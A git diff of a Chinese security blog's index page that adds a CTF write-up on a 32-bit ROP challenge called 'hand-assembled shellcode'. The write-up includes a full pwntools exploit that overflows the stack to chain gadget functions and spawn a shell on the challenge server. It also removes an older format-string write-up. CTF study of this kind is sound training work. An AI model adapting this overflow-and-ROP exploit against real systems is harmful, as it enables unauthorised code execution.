@@ -64,6 +64,53 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-32位shellcode：手拼shellcode" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/" class="article-date">
+  <time datetime="2023-06-18T01:12:23.000Z" itemprop="datePublished">2023-06-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/">32位shellcode：手拼shellcode</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h1><p>开启了NX栈不可执行保护<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618091900.png" alt="Alt text"></p>
+<h1 id="ida查看程序"><a href="#ida查看程序" class="headerlink" title="ida查看程序"></a>ida查看程序</h1><p>main函数<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092035.png" alt="Alt text"><br>welcome函数<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092108.png" alt="Alt text"><br>tryme函数<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092159.png" alt="Alt text"><br>win函数<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092417.png" alt="Alt text"><br>lonely_lodge函数<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092506.png" alt="Alt text"><br>剩下的几个函数都和lonely_loodge函数差不多<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092646.png" alt="Alt text"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>这道题叫做:手拼shellcode，</p>
+<p>题目程序中welcome函数里调用了mmap函数函数申请了了一段内存空间并将其地址赋值给了变量shellcode。</p>
+<p>tryme函数则是栈溢出点。</p>
+<p>其他几个函(如lonely_lodge、loot_lake等)都是用来修改shellcode中的内容的。这些函数会将一些特定的值写入shellcode中，每个函数最多写入4个字节，并且总共最多写入24个字节。</p>
+<p>以loot_lake函数为例</p>
+<p>AI说的：</p>
+<p>函数首先判断len变量s否大于23，如果是，则返回1，否则继续执行。然后将len的值自增，并将-64、64、-51和0x80这四个字节分别存储到一个名为shellcode的全局变量的不同偏移量处。</p>
+<p>具体来说，这段代码的作用是向全局变量shellcode中添加四个字节，这四个字节分别对应于汇编语言中的4条指令，这些指令将会在后续的ROP链中被调用。这个函数的返回值0表示添加字节的操作成功，返回值1表示添加字节的操作失败。<br><img src="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/QQ%E6%88%AA%E5%9B%BE20230618092506.png" alt="Alt text"></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- <span class="attr">coding</span>: utf-<span class="number">8</span> -*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#定义名为<span class="variable constant_">CTF</span>的函数，该函数接受<span class="number">4</span>个参数：目标<span class="variable constant_">IP</span>地址、端口号、是否开启调试模式、目标程序的文件名。</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">def <span class="title function_">CTF</span>(ip,port,debug,fllag):</span><br><span class="line">    elf = <span class="title function_">ELF</span>(fllag)</span><br><span class="line">    <span class="variable language_">global</span> p  #声明p为全局变量</span><br><span class="line">    <span class="keyword">if</span>(debug == <span class="number">1</span>):#判断是否开启调试模式</span><br><span class="line">            p = <span class="title function_">process</span>(fllag)</span><br><span class="line">            #若开启，则使用pwntools的process函数启动目标程序</span><br><span class="line"></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">            p = <span class="title function_">remote</span>(ip,port)</span><br><span class="line">            #否则使用pwntools的remote函数连接目标主机和端口。</span><br><span class="line">    win_addr = <span class="number">0x804967E</span></span><br><span class="line">    fgets_addr = <span class="number">0x80496CA</span></span><br><span class="line">    tilted_towers = <span class="number">0x804937C</span></span><br><span class="line">    junk_junction = <span class="number">0x804954A</span></span><br><span class="line">    snobby_shores = <span class="number">0x8049416</span></span><br><span class="line">    greasy_grove = <span class="number">0x80495E4</span></span><br><span class="line">    lonely_lodge = <span class="number">0x80492E2</span></span><br><span class="line">    dusty_depot = <span class="number">0x80494B0</span></span><br><span class="line"></span><br><span class="line">    shellcode = [<span class="number">0x804937C</span>,<span class="number">0x804954A</span>,<span class="number">0x8049416</span>,<span class="number">0x80495E4</span>,<span class="number">0x80492E2</span>,<span class="number">0x80494B0</span>]</span><br><span class="line">#定义变量shellcode，该变量包含<span class="number">6</span>个地址，这些地址是目标程序中的一些函数地址。</span><br><span class="line">    p.<span class="title function_">recvuntil</span>(b<span class="string">&quot;roppin boys?\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="attr">shellcode</span>:#循环遍历shellcode中的每个地址。</span><br><span class="line">            payload=b<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+<span class="title function_">p32</span>(i)+<span class="title function_">p32</span>(fgets_addr)</span><br><span class="line">            p.<span class="title function_">send</span>(payload)</span><br><span class="line">    payload2 = b<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+<span class="title function_">p32</span>(win_addr)+<span class="title function_">p32</span>(fgets_addr)</span><br><span class="line">    p.<span class="title function_">send</span>(payload2)</span><br><span class="line">    p.<span class="title function_">interactive</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:#判断当前脚本是否作为主程序运行</span><br><span class="line">    <span class="title function_">CTF</span>(<span class="string">&#x27;ctf.umbccd.io&#x27;</span>,<span class="number">4101</span>,<span class="number">1</span>,<span class="string">&#x27;./rop&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/" data-id="clj0t6tge000234v91f942uzf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-32位shellcode使用mprotect提升权限执行shellcode" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/" class="article-date">
@@ -105,7 +152,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/" data-id="clizyehvs0003ikv985k6gmgf" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/" data-id="clj0t6tgc000134v9feoy9apl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -155,7 +202,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" data-id="clizyehvq0001ikv94pljgtuq" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" data-id="clj0t6tgf000434v99tlua3ql" class="article-share-link">Share</a>
       
       
     </footer>
@@ -216,7 +263,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" data-id="clizyehvm0000ikv9bwfb7jol" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" data-id="clj0t6tg8000034v93ppo5u9c" class="article-share-link">Share</a>
       
       
     </footer>
@@ -252,7 +299,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/" data-id="clizyehvz000cikv976ihcdsx" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/" data-id="clj0t6tgl000d34v9htsy1d4p" class="article-share-link">Share</a>
       
       
     </footer>
@@ -309,7 +356,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/" data-id="clizyehvt0005ikv93z1l6no7" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/" data-id="clj0t6tgg000634v95sqx4n8t" class="article-share-link">Share</a>
       
       
     </footer>
@@ -369,7 +416,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/" data-id="clizyehvv0008ikv9fwq3h44y" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/" data-id="clj0t6tgi000a34v9gxmn3uiu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -421,7 +468,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="clizyehvu0006ikv91o3c4b4o" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="clj0t6tgh000834v93rdidec1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -467,7 +514,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="clizyehvv0007ikv903twaylb" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="clj0t6tgh000934v9g8jo8noy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -510,56 +557,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="clizyehvt0004ikv93ysgh8ea" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-32位格式化字符串-任意地址写就行" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" class="article-date">
-  <time datetime="2023-05-31T14:49:52.626Z" itemprop="datePublished">2023-05-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/">32位格式化字符串-任意地址写就行</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="32位格式化字符串-任意地址写就行"><a href="#32位格式化字符串-任意地址写就行" class="headerlink" title="32位格式化字符串-任意地址写就行"></a>32位格式化字符串-任意地址写就行</h1><h3 id="检查程序的保护"><a href="#检查程序的保护" class="headerlink" title="检查程序的保护:"></a>检查程序的保护:</h3><p>几乎没有任何保护<br><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE2.png"></p>
-<h3 id="运行程序："><a href="#运行程序：" class="headerlink" title="运行程序："></a>运行程序：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现程序会给你一个地址，并且你输入的地方存在格式化字符串漏洞</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20.png"></p>
-<h3 id="ida打开程序："><a href="#ida打开程序：" class="headerlink" title="ida打开程序："></a>ida打开程序：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现了程序一开始给我们的地址就是变量V5的地址，只要让整型变量V5等于4那么我们就能够获得shell了。可是整个程序中没有能够修改V5的函数，所以我们只能够通过格式化字符串来修改V5的值从而获得shell。</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/%E6%88%AA%E5%9B%BE.png" alt="Alt text"></p>
-<h3 id="gdb一下获得格式化字符串参数的偏移"><a href="#gdb一下获得格式化字符串参数的偏移" class="headerlink" title="gdb一下获得格式化字符串参数的偏移"></a>gdb一下获得格式化字符串参数的偏移</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过输入AAAAAA之后查看栈的地址我们可以知道我们输入的格式化字符串的参数为第六个格式化字符串参数。</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/666.png" alt="Alt text"></p>
-<h3 id="构建exp-py"><a href="#构建exp-py" class="headerlink" title="构建exp.py"></a>构建exp.py</h3><p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE2023.png" alt="Alt text"></p>
-<h3 id="exp的相关解释"><a href="#exp的相关解释" class="headerlink" title="exp的相关解释"></a>exp的相关解释</h3><p>1.为什么要在变量V5的前面多加一个A？<br>因为32位程序是以每四字节为一个内存单元的，而由于前面的”%4c”和”%8$n”占比不足4的倍数个字节，因此到了把变量V5的地址放入栈的时候就V5的地址就被拆开了一个字节。</p>
-<p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/G~J$$KZUMWM33E1QR00W.png" alt="Alt text"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在栈上V5的地址也是不对齐的。</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/123.png" alt="Alt text"><br><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/123.png"><br>所以我们才要多放一个A来多占一个字节从而让V5的地址能够在栈上对齐四个字节，这样程序才能识别出V5的地址。<br><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230531215613.png" alt="Alt text"></p>
-<p><img src="/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/122.png" alt="Alt text"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="clizyehvr0002ikv9dnzufh4d" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="clj0t6tgf000534v9aihb0klu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -605,6 +603,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/18/32%E4%BD%8Dshellcode%EF%BC%9A%E6%89%8B%E6%8B%BCshellcode/">32位shellcode：手拼shellcode</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/">32位shellcode使用mprotect提升权限执行shellcode</a>
           </li>
         
@@ -618,10 +620,6 @@
         
           <li>
             <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
           </li>
         
       </ul>
